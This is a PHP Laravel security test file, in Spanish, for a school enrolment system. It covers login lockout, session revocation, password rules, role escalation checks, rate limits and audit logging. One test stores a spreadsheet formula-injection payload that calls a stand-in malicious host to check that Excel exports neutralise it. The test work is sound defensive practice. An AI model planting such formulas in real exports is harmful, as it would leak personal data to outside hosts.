<?php

namespace Tests\Feature;

use App\Models\Rol;
use App\Models\User;
use App\Support\Auditoria;
use App\Support\LibroMatriculaSede;
use Database\Seeders\DatosInicialesSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use Tests\TestCase;

class SeguridadTest extends TestCase
{
    use RefreshDatabase;

    private function rol(string $nombre): int
    {
        return Rol::where('nombre', $nombre)->value('id');
    }

    public function test_el_login_frena_a_quien_prueba_claves_de_un_usuario()
    {
        $user = User::factory()->create();

        for ($i = 0; $i < 5; $i++) {
            $this->post('/login', ['usuario' => $user->usuario, 'password' => 'mala-clave-'.$i]);
        }

        // Ya bloqueado, ni la clave correcta entra.
        $this->post('/login', ['usuario' => $user->usuario, 'password' => 'password'])->assertSessionHasErrors('usuario');
        $this->assertGuest();
    }

    public function test_el_login_frena_a_quien_prueba_muchos_usuarios_desde_una_ip()
    {
        $user = User::factory()->create();

        for ($i = 0; $i < 40; $i++) {
            $this->post('/login', ['usuario' => 'nadie'.$i, 'password' => 'mala-clave']);
        }

        $this->post('/login', ['usuario' => $user->usuario, 'password' => 'password'])->assertSessionHasErrors('usuario');
        $this->assertGuest();
    }

    public function test_el_error_del_login_no_dice_si_el_usuario_existe()
    {
        $user = User::factory()->create();
        $inactivo = User::factory()->create(['activo' => false]);
        $mensaje = 'Usuario o clave incorrectos.';

        $this->post('/login', ['usuario' => $user->usuario, 'password' => 'mala-clave'])->assertSessionHasErrors(['usuario' => $mensaje]);
        $this->post('/login', ['usuario' => 'no-existe', 'password' => 'mala-clave'])->assertSessionHasErrors(['usuario' => $mensaje]);
        $this->post('/login', ['usuario' => $inactivo->usuario, 'password' => 'password'])->assertSessionHasErrors(['usuario' => $mensaje]);
    }

    public function test_un_usuario_desactivado_con_sesion_abierta_queda_afuera()
    {
        $user = User::factory()->create(['rol_id' => $this->rol('secretaria')]);
        $this->actingAs($user)->get('/settings/profile')->assertOk();

        DB::table('users')->where('id', $user->id)->update(['activo' => false]);
        Auth::forgetUser();

        $this->get('/settings/profile')->assertRedirect('/login');
        $this->assertGuest();
    }

    public function test_al_cambiar_la_clave_se_cierran_las_demas_sesiones()
    {
        config(['session.driver' => 'database']);
        $user = User::factory()->create(['remember_token' => 'recordado']);
        DB::table('sessions')->insert(['id' => 'otro-equipo', 'user_id' => $user->id, 'payload' => '', 'last_activity' => time()]);

        $this->actingAs($user)->from('/settings/password')->put('/settings/password', [
            'current_password' => 'password',
            'password' => 'clave-nueva-123',
            'password_confirmation' => 'clave-nueva-123',
        ])->assertSessionHasNoErrors();

        $this->assertSame(0, DB::table('sessions')->where('id', 'otro-equipo')->count());
        $this->assertNull($user->fresh()->remember_token);
    }

    public function test_al_desactivar_se_olvida_el_recordarme()
    {
        $admin = User::factory()->create(['rol_id' => $this->rol('administrador')]);
        $docente = User::factory()->create(['rol_id' => $this->rol('docente'), 'remember_token' => 'recordado']);

        $this->actingAs($admin)->put("/usuarios/{$docente->id}/estado", ['activo' => false])->assertSessionHasNoErrors();

        $this->assertNull($docente->fresh()->remember_token);
    }

    public function test_las_claves_nuevas_piden_diez_caracteres_con_letras_y_numeros()
    {
        $admin = User::factory()->create(['rol_id' => $this->rol('administrador')]);
        $docente = User::factory()->create(['rol_id' => $this->rol('docente')]);

        foreach (['corta-1', 'solo-letras-sin-numero', '12345678901234'] as $mala) {
            $this->actingAs($admin)->put("/usuarios/{$docente->id}/clave", ['password' => $mala])->assertSessionHasErrors('password');
        }
        $this->actingAs($admin)->put("/usuarios/{$docente->id}/clave", ['password' => 'clave-buena-123'])->assertSessionHasNoErrors();
    }

    public function test_quien_gestiona_usuarios_no_reparte_mas_de_lo_que_puede()
    {
        $gestor = Rol::where('nombre', 'coordinacion')->first();
        DB::table('rol_permiso')->where('rol_id', $gestor->id)->delete();
        DB::table('rol_permiso')->insert(['rol_id' => $gestor->id, 'permiso' => 'gestionar-usuarios']);
        $yo = User::factory()->create(['rol_id' => $gestor->id, 'todas_las_sedes' => false]);
        DB::table('instituciones')->insert(['id' => 1, 'nombre' => 'Institución de prueba']);
        $mia = DB::table('sedes')->insertGetId(['institucion_id' => 1, 'codigo' => 'A', 'nombre' => 'Sede A']);
        $ajena = DB::table('sedes')->insertGetId(['institucion_id' => 1, 'codigo' => 'B', 'nombre' => 'Sede B']);
        DB::table('sede_user')->insert(['user_id' => $yo->id, 'sede_id' => $mia]);

        $base = ['name' => 'Nuevo', 'usuario' => 'nuevo', 'email' => '', 'password' => 'clave-buena-123'];
        $puedeMas = Rol::create(['nombre' => 'poderoso', 'etiqueta' => 'Poderoso']);
        DB::table('rol_permiso')->insert(['rol_id' => $puedeMas->id, 'permiso' => 'ver-estudiantes']);

        // Un rol que puede más que el suyo.
        $this->actingAs($yo)->post('/usuarios', [...$base, 'rol_id' => $puedeMas->id, 'sedes' => [$mia]])->assertSessionHasErrors('rol_id');
        // Sedes que él no ve, o todas.
        $this->actingAs($yo)->post('/usuarios', [...$base, 'rol_id' => $gestor->id, 'sedes' => [$ajena]])->assertSessionHasErrors('sedes');
        $this->actingAs($yo)->post('/usuarios', [...$base, 'rol_id' => $gestor->id, 'todas_las_sedes' => true])->assertSessionHasErrors('sedes');
        // Cambiarle la clave a alguien que puede más: entraría como esa persona.
        $otro = User::factory()->create(['rol_id' => $puedeMas->id]);
        $this->actingAs($yo)->put("/usuarios/{$otro->id}/clave", ['password' => 'clave-buena-123'])->assertSessionHasErrors('rol_id');

        $this->assertNull(User::where('usuario', 'nuevo')->first());
    }

    public function test_no_hay_ruta_para_descargar_archivos_privados()
    {
        $this->assertNull(Route::getRoutes()->getByName('storage.local'));
        $this->assertNull(Route::getRoutes()->getByName('storage.local.upload'));
    }

    public function test_un_igual_en_el_formulario_publico_no_es_una_formula_en_el_excel()
    {
        $this->seed(DatosInicialesSeeder::class);
        $m = DB::table('matriculas as m')->join('anios_lectivos as al', 'al.id', '=', 'm.anio_lectivo_id')->join('sedes as s', 's.id', '=', 'm.sede_id')
            ->where('al.estado', 'activo')->where('m.estado', 'activo')->whereNotNull('m.grupo_id')->first(['m.id', 'm.estudiante_id', 'm.grupo_id', 'al.anio', 's.codigo as sede']);
        $ataque = '=HYPERLINK("http://sitio-malo.test/?d="&AN3,"Ver")';
        DB::table('acudientes')->whereIn('id', DB::table('estudiante_acudiente')->where('estudiante_id', $m->estudiante_id)->pluck('acudiente_id'))->update(['direccion' => $ataque]);
        DB::table('matriculas')->where('id', $m->id)->update(['observaciones' => $ataque]);

        [$libro] = LibroMatriculaSede::generar((int) $m->anio, $m->sede);

        $hoja = $libro->getSheetByName(DB::table('grupos')->where('id', $m->grupo_id)->value('codigo'));
        $encontrados = 0;
        foreach ($hoja->getRowIterator(3) as $fila) {
            foreach (['BC', 'BQ'] as $col) {
                $celda = $hoja->getCell($col.$fila->getRowIndex());
                if ($celda->getValue() === $ataque) {
                    $this->assertSame(DataType::TYPE_STRING, $celda->getDataType());
                    $encontrados++;
                }
            }
        }
        $this->assertGreaterThan(0, $encontrados);
        // La fórmula propia del libro (la edad) sí sigue siendo fórmula.
        $this->assertSame(DataType::TYPE_FORMULA, $hoja->getCell('A1')->getDataType());
    }

    public function test_el_formulario_publico_tiene_tope_por_hora_y_por_minuto()
    {
        $limite = RateLimiter::limiter('inscripcion');
        $topes = $limite(request());

        $this->assertSame([30, 300], array_map(fn ($t) => $t->maxAttempts, $topes));
    }

    public function test_queda_constancia_de_quien_entro_y_de_lo_que_cambio()
    {
        $canal = Log::spy();
        Log::shouldReceive('channel')->with('auditoria')->andReturn($canal);
        $admin = User::factory()->create(['rol_id' => $this->rol('administrador')]);
        $docente = User::factory()->create(['rol_id' => $this->rol('docente')]);

        $this->post('/login', ['usuario' => $admin->usuario, 'password' => 'mala-clave']);
        $canal->shouldHaveReceived('info')->withArgs(fn ($e, $d) => $e === 'ingreso_fallido' && ! array_key_exists('password', $d));

        $this->post('/login', ['usuario' => $admin->usuario, 'password' => 'password']);
        $canal->shouldHaveReceived('info')->withArgs(fn ($e) => $e === 'ingreso');

        $this->put("/usuarios/{$docente->id}/clave", ['password' => 'clave-secreta-123']);
        $canal->shouldHaveReceived('info')->withArgs(fn ($e, $d) => $e === 'accion'
            && ($d['ruta'] ?? null) === 'usuarios.clave'
            && $d['usuario'] === $admin->usuario
            && ! str_contains(json_encode($d), 'clave-secreta-123'));
    }

    public function test_si_no_se_puede_escribir_la_auditoria_la_persona_sigue_trabajando()
    {
        Log::shouldReceive('channel')->andThrow(new \RuntimeException('disco lleno'));

        Auditoria::anotar('accion');

        $this->assertTrue(true);
    }
}
